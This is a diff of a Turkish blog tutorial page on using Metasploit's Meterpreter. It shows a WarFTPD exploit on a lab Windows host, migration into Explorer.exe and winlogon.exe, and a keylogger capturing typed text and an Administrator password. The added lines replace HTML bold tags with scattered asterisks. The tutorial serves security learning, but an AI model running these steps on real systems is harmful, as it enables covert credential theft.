@@ -30,7 +30,7 @@ Bazı durumlarda, hedef üzerinde yaptığınız çalışmalar sistemi kararsız
 Bazı durumlarda, hedef üzerinde yaptığınız çalışmalar sistemi kararsız hale getirebilir. Sistemin tekrar başlatılması gerektiğinde bağlantınız da kopacaktır. Bu gibi durumlar için, hedef sisteme tekrar bağlanmanın kolay bir yolunu oluşturmak faydalı olacaktır.">
   <meta itemprop="datePublished" content="2017-06-15T13:54:00+00:00">
   <meta itemprop="dateModified" content="2017-06-15T13:54:00+00:00">
-  <meta itemprop="wordCount" content="488">
+  <meta itemprop="wordCount" content="525">
   <meta itemprop="keywords" content="Cybersecurity,Metasploit Framework">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="MSF Meterpreter Kalıcılık Sağlama">
@@ -9693,29 +9693,29 @@ Bazı durumlarda, hedef üzerinde yaptığınız çalışmalar sistemi kararsız
 <p>Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. <em>Çok hızlı</em> olmak veya <em>çok yavaş</em> olmak. Keylogger, yani kullanıcının tuşlarını ve yazdıklarını kaydetmek, yavaş yaklaşıma bir örnektir. Bu yaklaşımda, gerçekleştirmek istediğiniz işlemleri çok hızlı yapamazsınız ancak uzun vadede çok kullanışlı bilgiler elde edebilirsiniz.</p>
 <p>Öncelikle, bir exploit modülü kullanarak hedef sistemde oturum çalım.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>warftpd_165_user<strong>)</strong> <strong>&gt;</strong> exploit
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** warftpd_165_user***)***  ***&gt;***  exploit
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
-<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
-<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to FTP server 172.16.104.145:21...
-<strong>[</strong><strong>*</strong><strong>]</strong> Connected to target FTP server.
-<strong>[</strong><strong>*</strong><strong>]</strong> Trying target Windows 2000 SP0-SP4 English...
-<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
-<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
-<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
-<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 4 opened <strong>(</strong>172.16.104.130:4444 -&gt; 172.16.104.145:1246<strong>)</strong>
+***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
+***[*** ******* ***]***  Started reverse handler
+***[*** ******* ***]***  Connecting to FTP server 172.16.104.145:21...
+***[*** ******* ***]***  Connected to target FTP server.
+***[*** ******* ***]***  Trying target Windows 2000 SP0-SP4 English...
+***[*** ******* ***]***  Transmitting intermediate stager ***for *** over-sized stage...***(*** 191 bytes***)*** 
+***[*** ******* ***]***  Sending stage ***(*** 2650 bytes***)*** 
+***[*** ******* ***]***  Sleeping before handling stage...
+***[*** ******* ***]***  Uploading DLL ***(*** 75787 bytes***)*** ...
+***[*** ******* ***]***  Upload completed.
+***[*** ******* ***]***  Meterpreter session 4 opened ***(*** 172.16.104.130:4444 -&gt; 172.16.104.145:1246***)*** 
 
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 <p>Oturum açıldıktan sonra, tuşları kayıt etmek için <code>Explorer.exe</code> prosesine geçmek başarı için daha garanti bir yoldur. Hedef sistemde <code>Explorer.exe</code> uygulaması, hangi PID numarasıyla çalışıyor öğreniyoruz ve <code>migrate</code> komutuyla geçiş yapıyoruz.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ps
 
 Process list
-<strong>============</strong>
+***============*** 
 
     PID   Name               Path                                                   
     ---   ----               ----                                                   
@@ -9740,18 +9740,18 @@ Process list
     972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe 
     1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe 
 
-meterpreter <strong>&gt;</strong> migrate 768
-<strong>[</strong><strong>*</strong><strong>]</strong> Migrating to 768...
-<strong>[</strong><strong>*</strong><strong>]</strong> Migration completed successfully.
-meterpreter <strong>&gt;</strong> getpid
+meterpreter ***&gt;***  migrate 768
+***[*** ******* ***]***  Migrating to 768...
+***[*** ******* ***]***  Migration completed successfully.
+meterpreter ***&gt;***  getpid
 Current pid: 768
 </code></pre>
 <!-- /wp:code -->
 <p>PID geçişini kontrol ettikten sonra keylogger işlemini başlatalım.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> keyscan_start
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  keyscan_start
 Starting the keystroke sniffer...
-meterpreter <strong>&gt;</strong> keyscan_dump
+meterpreter ***&gt;***  keyscan_dump
 Dumping captured keystrokes...
    tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
 </code></pre>
@@ -9759,27 +9759,27 @@ Dumping captured keystrokes...
 <p>Bir miktar süre geçtikten sonra kayıt dosyasını görmek için <code>keyscan_dump</code> komutunu kullanabilirsiniz. Yakalanan tuş vuruşlarını incelediğinizde, CTRL veya ALT gibi tuşların log dosyasına nasıl kayıt edildiğini de öğrenebilirsiniz.</p>
 <p>Ayrıca, oturum açma bilgilerini de yakalamak isterseniz, <code>Explorer.exe</code> yerine <code>migrate</code> komutuyla, <code>winlogon</code> prosesine geçebilirsiniz.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> ps
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  ps
 
 Process list
-<strong>=================</strong>
+***=================*** 
 
 PID Name         Path
 --- ----         ----
 401 winlogon.exe C:\WINNT\system32\winlogon.exe
 
-meterpreter <strong>&gt;</strong> migrate 401
+meterpreter ***&gt;***  migrate 401
 
-<strong>[</strong><strong>*</strong><strong>]</strong> Migrating to 401...
-<strong>[</strong><strong>*</strong><strong>]</strong> Migration completed successfully.
+***[*** ******* ***]***  Migrating to 401...
+***[*** ******* ***]***  Migration completed successfully.
 
-meterpreter <strong>&gt;</strong> keyscan_start
+meterpreter ***&gt;***  keyscan_start
 Starting the keystroke sniffer...
 </code></pre>
 <!-- /wp:code -->
 <p>Kayıt esnasında bir Administrator kullanıcı oturumu açılmıştır. Sonucuna bakalım.</p>
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> keyscan_dump
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  keyscan_dump
 Dumping captured keystrokes...
 Administrator ohnoes1vebeenh4x0red!
 </code></pre>
